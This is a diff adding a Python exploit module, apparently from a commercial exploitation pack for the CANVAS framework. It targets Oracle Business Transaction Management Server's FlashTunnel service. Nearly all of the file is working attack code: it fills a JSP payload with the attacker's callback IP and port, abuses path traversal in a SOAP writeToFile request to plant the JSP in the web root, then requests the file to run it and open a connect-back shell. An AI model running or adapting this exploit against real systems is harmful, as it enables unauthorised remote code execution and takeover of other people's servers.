@@ -1,0 +1,146 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+import time
+import os
+import random
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Oracle Business Transaction Management Server FlashTunnel Service Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in Oracle Business Transaction Management Server FlashTunnel Service"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Oracle"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "Oracle Business Transaction Management Server 12.1.0.2.7"
+DOCUMENTATION["Date public"] = "2012.08.07"
+DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/20318/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_btm/d2.jsp"    
+    self.protocol = "http"
+    self.port = 7001
+    self.sslport = 443
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):  
+    # Open JSP file
+    f = open(self.filename, "r")
+    payload = f.read()
+    f.close()
+    
+    payload = payload.replace("CALLBACK_IP", self.callback.ip)
+    payload = payload.replace("CALLBACK_PORT", str(self.callback.port))  
+    payload = payload.replace("&", "&amp;").replace("\"", "&quot;").replace("'", "&#039;").replace("<", "&lt;").replace(">", "&gt;")
+                
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+
+    ua = spkproxy.UserAgent("", exploit=self)
+    
+    # Upload JSP file     
+    name = ''.join(random.choice(string.ascii_lowercase) for x in range(8))
+    filename = "../../../../../../../../../../server/examples/build/mainWebApp/%s.jsp"%name
+      
+    params  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">\n'
+    params += '<soapenv:Header/>\n'        
+    params += '<soapenv:Body>\n'
+    params += '  <int:writeToFileRequest>\n'
+    params += '    <int:writeToFile handle="' + filename + '">\n'
+    params += '        <typ:text>' + payload + '</typ:text>\n'
+    params += '        <typ:WriteToFileRequestVersion></typ:WriteToFileRequestVersion>\n'
+    params += '    </int:writeToFile>\n'
+    params += '  </int:writeToFileRequest>\n'
+    params += '</soapenv:Body>\n'
+    params += '</soapenv:Envelope>\n'
+                  
+    url = "/btmui/soa/flash_svc/"    
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    ua.addHeader("Content-Type", "text/xml;charset=UTF-8")
+    data = ua.POST(mainurl, params)    
+	
+    # Execute uploaded JSP file
+    url = "/%s.jsp"%name
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)    
+    data = ua.GET(mainurl)
+            		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
